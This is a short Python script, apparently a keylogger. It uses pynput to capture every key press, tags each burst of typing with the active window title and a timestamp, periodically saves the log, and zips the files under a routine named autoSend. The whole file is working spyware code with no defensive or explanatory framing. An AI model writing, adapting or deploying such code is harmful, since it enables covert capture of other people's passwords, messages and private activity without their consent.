from pynput import keyboard
import pygetwindow as gw
import utils.func as f

prevWindow = ''
future = f.futureTime(1,'int')
autoSend = f.futureTime(1,'int')
memory = ""

def onPress(key):
    global prevWindow, future, memory, autoSend
    current = gw.getActiveWindow()
    checkSave = f.checkFlag(future)
    checkSend = f.checkFlag(autoSend)
    if prevWindow != current:
        memory += f"{current} :: {f.currentTime()} ::\n"
        try:
            memory+=f"{key.char}\n"
        except AttributeError:
            memory+=f"{key}\n"
        prevWindow = current
    else:
        try:
            memory+=f"{key.char}\n"
        except AttributeError:
            memory+=f"{key}\n"
            
    if checkSave:
        f.save(memory)
        future = f.futureTime(1,'int')
        memory = ""
        
    if checkSend:
        f.zipFiles()
        autoSend = f.futureTime(1,'int')
        
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=onPress) as listener:
    listener.join()